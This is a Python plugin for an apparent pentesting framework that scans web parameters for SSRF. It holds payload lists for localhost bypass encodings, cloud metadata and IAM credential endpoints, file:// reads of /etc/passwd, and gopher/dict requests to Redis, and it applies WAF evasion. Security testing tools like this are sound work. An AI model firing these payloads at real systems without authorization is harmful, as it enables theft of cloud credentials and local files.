"""SSRF vulnerability scanner â€” IP bypass, cloud metadata, protocol schemes.

Integrates with ctx.waf_bypass for WAF evasion and ctx.oob for
DNS rebinding and blind SSRF confirmation.
"""

from __future__ import annotations

from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# IP bypass variants for localhost
IP_BYPASS_VARIANTS: list[tuple[str, str]] = [
    ("http://127.0.0.1", "Standard localhost"),
    ("http://0.0.0.0", "All interfaces"),
    ("http://[::1]", "IPv6 localhost"),
    ("http://127.1", "Short localhost"),
    ("http://0x7f000001", "Hex localhost"),
    ("http://2130706433", "Decimal localhost"),
    ("http://0177.0.0.1", "Octal localhost"),
    ("http://0x7f.0x0.0x0.0x1", "Hex dotted"),
    ("http://[0:0:0:0:0:ffff:127.0.0.1]", "IPv6 mapped"),
    ("http://127.0.0.1.nip.io", "DNS rebinding nip.io"),
    ("http://localtest.me", "DNS resolves to 127.0.0.1"),
]

# Cloud metadata endpoints
CLOUD_METADATA: list[tuple[str, str]] = [
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDSv1 metadata"),
    (
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "AWS IAM credentials",
    ),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    (
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "Azure metadata",
    ),
    ("http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
]

# Protocol schemes
PROTOCOL_SCHEMES: list[tuple[str, str]] = [
    ("file:///etc/passwd", "Local file read (Linux)"),
    ("file:///c:/windows/win.ini", "Local file read (Windows)"),
    ("gopher://127.0.0.1:6379/_INFO", "Gopher Redis"),
    ("dict://127.0.0.1:6379/info", "Dict Redis"),
]

# Common SSRF-vulnerable parameters
SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "target", "proxy",
    "img", "image", "src", "source", "link", "href", "file",
    "page", "feed", "host", "site", "callback", "return", "next",
    "data", "reference", "ref", "fetch", "load", "resource",
]


class SsrfCheckPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="ssrf_check",
        display_name="SSRF Scanner",
        category=PluginCategory.PENTESTING,
        description=(
            "SSRF detection: localhost bypass variants, cloud metadata, "
            "protocol schemes, DNS rebinding. WAF-adaptive."
        ),
        depends_on=["http_headers"],
        produces=["ssrf_results"],
        timeout=90.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available",
            )

        from basilisk.utils.http_check import resolve_base_url

        findings: list[Finding] = []
        data: dict = {"tested_params": [], "tested_payloads": 0}

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data=data,
            )

        # Get WAF engine
        waf_engine = getattr(ctx, "waf_bypass", None)
        if waf_engine:
            waf_engine.set_waf_from_pipeline(target.host, ctx.pipeline)

        # Get params from crawled data or use defaults
        params = self._get_params(target.host, ctx)
        data["tested_params"] = params

        payloads_tested = 0

        for param in params[:10]:
            if ctx.should_stop or len(findings) >= 5:
                break

            # Test IP bypass variants
            for ssrf_url, desc in IP_BYPASS_VARIANTS:
                if ctx.should_stop:
                    break
                test_urls = [ssrf_url]
                if waf_engine and getattr(waf_engine, "waf_detected", False):
                    test_urls = waf_engine.encode_for_context(
                        ssrf_url, "query",
                    )[:3]

                for payload in test_urls:
                    payloads_tested += 1
                    finding = await self._test_ssrf(
                        ctx, base_url, param, payload, desc,
                    )
                    if finding:
                        findings.append(finding)
                        break
                if findings:
                    break

            # Test cloud metadata
            if not findings:
                for meta_url, desc in CLOUD_METADATA:
                    if ctx.should_stop:
                        break
                    payloads_tested += 1
                    finding = await self._test_ssrf(
                        ctx, base_url, param, meta_url, desc,
                    )
                    if finding:
                        findings.append(finding)
                        break

        data["tested_payloads"] = payloads_tested

        if not findings:
            findings.append(Finding.info(
                "No SSRF detected",
                tags=["pentesting", "ssrf"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data=data,
        )

    def _get_params(self, host: str, ctx) -> list[str]:
        """Get params from crawled data or defaults."""
        state = getattr(ctx, "state", None)
        if state is None:
            return SSRF_PARAMS[:10]
        crawled = state.get("crawled_params", {}).get(host, [])
        ssrf_relevant = [p for p in crawled if p.lower() in SSRF_PARAMS]
        if ssrf_relevant:
            return list(dict.fromkeys(ssrf_relevant + SSRF_PARAMS[:5]))[:15]
        return SSRF_PARAMS[:10]

    async def _test_ssrf(
        self, ctx, base_url: str, param: str,
        ssrf_url: str, description: str,
    ) -> Finding | None:
        """Test a single SSRF payload."""
        try:
            url = f"{base_url}/?{param}={quote(ssrf_url, safe='')}"
            async with ctx.rate:
                resp = await ctx.http.get(url, timeout=10.0)
                body = await resp.text(encoding="utf-8", errors="replace")

                # Check for SSRF indicators in response
                indicators = self._check_ssrf_indicators(body, ssrf_url)
                if indicators:
                    severity = (
                        "critical" if "metadata" in description.lower() else "high"
                    )
                    return getattr(Finding, severity)(
                        f"SSRF detected via {param}: {description}",
                        description=(
                            f"SSRF vulnerability on parameter '{param}'. "
                            f"The server fetched internal resource: {description}"
                        ),
                        evidence=(
                            f"Parameter: {param}\n"
                            f"Payload: {ssrf_url}\n"
                            f"Indicators: {', '.join(indicators)}\n"
                            f"Response snippet: {body[:200]}"
                        ),
                        remediation=(
                            "Validate and whitelist URLs server-side. "
                            "Block internal IP ranges. Use SSRF-safe HTTP libraries."
                        ),
                        confidence=0.8,
                        tags=["pentesting", "ssrf"],
                    )
        except Exception:
            pass
        return None

    @staticmethod
    def _check_ssrf_indicators(body: str, ssrf_url: str) -> list[str]:
        """Check response body for SSRF success indicators."""
        indicators: list[str] = []
        body_lower = body.lower()

        # AWS metadata indicators
        if "169.254.169.254" in ssrf_url and any(k in body_lower for k in (
            "ami-id", "instance-id", "security-credentials",
            "iam", "meta-data", "instance-type",
        )):
            indicators.append("AWS metadata content")

        # GCP metadata
        if "metadata.google.internal" in ssrf_url and any(k in body_lower for k in (
            "project-id", "service-accounts", "computemetadata",
        )):
            indicators.append("GCP metadata content")

        # Local file indicators
        if "file://" in ssrf_url and (
            "root:" in body or "[extensions]" in body
        ):
            indicators.append("Local file content")

        # Internal service indicators
        if any(k in body_lower for k in (
            "redis_version", "memcached", "mongodb",
            "elasticsearch", "docker", "kubernetes",
        )):
            indicators.append("Internal service response")

        # Generic: response body contains data not typical for the app
        if len(body) > 0 and "127.0.0.1" in ssrf_url and any(
            k in body_lower for k in (
                "<title>", "apache", "nginx", "welcome to",
                "default page", "it works",
            )
        ):
            indicators.append("Localhost web content")

        return indicators
